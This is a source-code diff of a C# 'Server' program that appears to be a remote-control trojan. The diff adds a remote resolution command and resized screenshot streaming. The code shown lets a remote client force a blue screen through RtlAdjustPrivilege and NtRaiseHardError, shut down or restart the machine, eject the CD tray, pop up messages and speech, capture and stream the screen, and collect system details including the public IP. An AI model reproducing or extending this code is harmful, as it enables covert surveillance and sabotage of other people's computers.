@@ -26,10 +26,12 @@ namespace Server
 {
     class Program
     {
-
+        //cdtray
         [DllImport("winmm.dll")]
         private static extern int mciSendString(string command, string buffer, int bufferSize, IntPtr hwndCallback);
 
+
+        //bsod
         [DllImport("ntdll.dll")]
         public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);
 
@@ -38,7 +40,6 @@ namespace Server
 
 
         //gdi
-
         [DllImport("user32.dll")]
         private static extern IntPtr GetDC(IntPtr hWnd);
 
@@ -92,8 +93,9 @@ namespace Server
         static string systemInfo;
         static IHardwareInfo hardwareInfo;
 
-
         private static IntPtr screenDC;
+
+        private static Size size = new Size(1920, 1080);
 
 
         static async Task Main(string[] args)
@@ -421,6 +423,7 @@ namespace Server
                             if (parts.Length < 2)
                             {
                                 Console.WriteLine("Invalid format for messagebox. Use: text|title|buttons|icon");
+                                Console.WriteLine("Received data from client: " + receivedData);
                                 return;
                             }
 
@@ -455,7 +458,7 @@ namespace Server
                             if (parts.Length < 2)
                             {
                                 Console.WriteLine("Invalid format for TTS. Use: text|speed");
-                                Console.WriteLine(receivedData);
+                                Console.WriteLine("Received data from client: " + receivedData);
                                 return;
                             }
 
@@ -472,7 +475,7 @@ namespace Server
                             if (parts.Length < 3)
                             {
                                 Console.WriteLine("Invalid format for TTS. Use: text|speaker|speed");
-                                Console.WriteLine(receivedData);
+                                Console.WriteLine("Received data from client: " + receivedData);
                                 return;
                             }
 
@@ -481,6 +484,21 @@ namespace Server
                             float speed = float.Parse(parts[2], System.Globalization.CultureInfo.InvariantCulture);
 
                             await PlayTTS(text, (Speakers)Enum.Parse(typeof(Speakers), speaker), speed);  
+                        }
+
+                        if (receivedData.StartsWith("resolution"))
+                        {
+                            string[] parts = receivedData.Substring(10).Split('|');
+
+                            if (parts.Length < 2)
+                            {
+                                Console.WriteLine("Invalid format for resolution. Use: width|height");
+                                Console.WriteLine("Received data from client: " + receivedData);
+                                return;
+                            }
+
+                            size.Width = Convert.ToInt32(parts[0]);
+                            size.Height = Convert.ToInt32(parts[1]);
                         }
 
 
@@ -570,7 +588,7 @@ namespace Server
             }
             catch (IOException ex) when (ex.InnerException is SocketException)
             {
-                Console.WriteLine("Client disconnected.");
+                Console.WriteLine("Recieve commands client disconnected.");
             }
             catch (Exception ex)
             {
@@ -652,7 +670,7 @@ namespace Server
                                 if (!success)
                                 {
                                     // If sending fails, break out of the loop
-                                    Console.WriteLine("Client disconnected.");
+                                    Console.WriteLine("Screen client disconnected.");
                                     break;
                                 }
                                 frameBatch.Clear(); // Reset the batch
@@ -666,7 +684,7 @@ namespace Server
             catch (IOException ex) when (ex.InnerException is SocketException)
             {
                 // Client disconnected
-                Console.WriteLine("Client disconnected.");
+                Console.WriteLine("Screen client disconnected.");
             }
             catch (Exception ex)
             {
@@ -750,7 +768,7 @@ namespace Server
             }
             catch (IOException e) when (e.InnerException is SocketException)
             {
-                Console.WriteLine("Client disconnected.");
+                Console.WriteLine("Screen client disconnected.");
             }
             catch (Exception e)
             {
@@ -824,7 +842,6 @@ namespace Server
             }
         }
 
-
         static void Shutdown()
         {
             ProcessStartInfo psi = new ProcessStartInfo("shutdown", "/s /f /t 0");
@@ -832,7 +849,6 @@ namespace Server
             psi.UseShellExecute = false;
             Process.Start(psi);
         }
-
 
         static void Restart()
         {
@@ -869,7 +885,6 @@ namespace Server
             RtlAdjustPrivilege(19, true, false, out bool t1);
             NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out uint t2);
         }
-
 
         static string GetSystemInfo()
         {
@@ -975,7 +990,6 @@ namespace Server
             return "None";
         }
 
-
         static string GetDrives()
         {
             StringBuilder drives = new StringBuilder();
@@ -999,7 +1013,6 @@ namespace Server
             return (totalMemory / (1024 * 1024 * 1024)).ToString();
         }
 
-
         private static string GetBootTime()
         {
             var query = new System.Management.ManagementObjectSearcher("SELECT LastBootUpTime FROM Win32_OperatingSystem");
@@ -1010,7 +1023,6 @@ namespace Server
             }
             return "Unknown";
         }
-
 
         private static string GetPublicIPAddress()
         {
@@ -1023,7 +1035,6 @@ namespace Server
                 return "Unknown";
             }
         }
-
 
         static (string IpAddress, string MacAddress, string Speed, string Name) GetNIC()
         {
@@ -1057,9 +1068,10 @@ namespace Server
         }
 
 
+
         static Bitmap CaptureScreen()
         {
-            Rectangle bounds = Screen.PrimaryScreen.Bounds;
+            Rectangle bounds = Screen.AllScreens[0].Bounds;
             Bitmap screenshot = new Bitmap(bounds.Width, bounds.Height);
 
             using (Graphics g = Graphics.FromImage(screenshot))
@@ -1075,7 +1087,11 @@ namespace Server
                     currentCursor.Draw(g, cursorBounds);
                 }
             }
-            return screenshot;
+
+            Bitmap resizedScreenshot = new Bitmap(screenshot, size);
+            screenshot.Dispose();
+
+            return resizedScreenshot;
         }
     }
 
@@ -1094,7 +1110,6 @@ namespace Server
         tambet,
         vesta
     }
-
 
     public class SystemInfo
     {
